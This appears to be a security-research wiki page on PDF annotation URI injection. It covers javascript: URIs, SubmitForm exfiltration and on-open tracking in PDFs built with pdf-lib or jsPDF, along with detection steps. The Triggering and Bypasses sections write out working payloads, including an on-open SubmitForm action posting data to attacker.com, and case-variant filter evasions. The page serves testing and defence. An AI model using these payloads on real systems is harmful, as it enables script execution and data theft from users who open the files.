---
title: PDF annotation URI injection
slug: pdf-annotation-injection
created_utc: 2026-05-19T00:00:00Z
updated_utc: 2026-05-19T00:00:00Z
tags: [technique/dom-xss, technique/client-side, technique/pdf]
inbound: []
---

# PDF annotation URI injection

## Pattern
PDF-generation libraries (pdf-lib, jsPDF, pdfmake) allow annotations with
arbitrary URI actions. If user-controlled input is embedded into a URI
annotation without sanitization, an attacker can inject a `javascript:`
URI. When the victim opens the PDF and clicks the annotation link, the
script executes in the context of whatever origin renders the PDF (browser
built-in viewer, embedded PDF.js, native app).

Three attack sub-variants discovered by Gareth Heyes:

1. **Direct javascript: URI**: annotation `A` action with `URI` set to
   `javascript:alert(document.domain)`. Fires on click in Chrome PDF
   viewer and Firefox PDF.js when the PDF is rendered on an `https://`
   origin (not `chrome-extension://`).

2. **submitForm blind exfiltration**: annotation action
   `SubmitForm` with `Flags` set to `SubmitHTML`. When clicked, the PDF
   viewer submits all visible form fields (including hidden text fields
   with injected values) as an HTTP POST to an attacker-controlled URL.
   Works for blind data exfiltration without JavaScript.

3. **Open/close tracking oracle**: PDF actions `AA` (additional actions)
   on the document-level: `O` (on-open) and `C` (on-close) can trigger
   URI actions when the PDF is viewed/dismissed. Allows tracking whether
   the victim opened the PDF without any click — useful as a reporting
   oracle.

Vulnerable libraries:
- **pdf-lib** ≥ 1.x (current as of 2022): exposes `PDFAnnotation` API
  that accepts raw action dictionaries.
- **jsPDF**: `addAnnotation()` does not sanitize URI schemes.
- Apps that accept user-provided filenames/titles and render them into PDF
  metadata or annotation text fields without escaping.

## Preconditions
- Application generates PDFs server-side or client-side using a vulnerable
  library.
- User-controlled input reaches a URI or text annotation field (filename,
  title, description, user name, link field).
- PDF is rendered in a browser context (inline viewer, PDF.js, or
  Chrome/Firefox built-in) on a non-extension origin.
- For submitForm: PDF has at least one form field; attacker controls the
  action URL.

## Detection
- Find endpoints that generate or serve PDFs; enumerate parameters that
  appear in the PDF content (filename, title, body copy, link URLs).
- Download the PDF; open in a hex editor or `qpdf --qdf` and search for
  `/URI`, `/SubmitForm`, `/AA`, `/A` in annotation dictionaries.
- Test with `javascript:alert(1)` as a URL parameter that feeds into a
  link field.
- Check the server-side library (`package.json`, `Gemfile`, `go.mod`) for
  pdf-lib or jsPDF versions without sanitization.

## Triggering
Inject into a URL or title parameter:
```
?url=javascript%3Aalert%28document.domain%29
```
Generated PDF annotation:
```
/Annots [<< /Type /Annot /Subtype /Link /Rect [...] /A << /S /URI /URI (javascript:alert(document.domain)) >> >>]
```
Open the PDF in Chrome (PDF.js or built-in viewer). Click the annotation.

For submitForm exfil (no click required if on-open action):
```
/AA << /O << /S /SubmitForm /F (https://attacker.com/collect) /Flags 6 >> >>
```

## Bypasses
- **Chrome viewer sandboxes javascript: in annotations**: if Chrome's
  built-in viewer blocks it, try PDF.js embedded in an `https://` page
  (no sandbox), or submit via link to `data:` URI that redirects.
- **Annotation URL validation on server**: bypass with `jAvAsCrIpT:` case
  variants or `javascript:void(0)/*%0a*/+alert(1)` if URL is parsed with
  regex.
- **submitForm blocked by SameSite cookies**: exfil doesn't need cookies —
  inject form field values directly; any visible text field content is
  submitted.

## Seen in the wild
- Gareth Heyes (PortSwigger): discovered pdf-lib + jsPDF annotation
  injection; presented at PortSwigger TV (2022).
- aws-imds-iframe-pdf.md: [[aws-imds-iframe-pdf]] shows adjacent PDF+iframe
  SSRF chain.
- Several unspecified bounty programs; Heyes noted it appears whenever a
  web app outputs user-controlled data into generated PDFs.

## References
- PortSwigger TV: "PDF XSS: It's Here and It's Real" — Gareth Heyes
  (2022) — `wiki/sources/portswigger-tv/whisper/transcripts/Sz-zEDNTe8U_*.txt`
- Related: [[aws-imds-iframe-pdf]], [[consuming-tags-and-hoisting]]
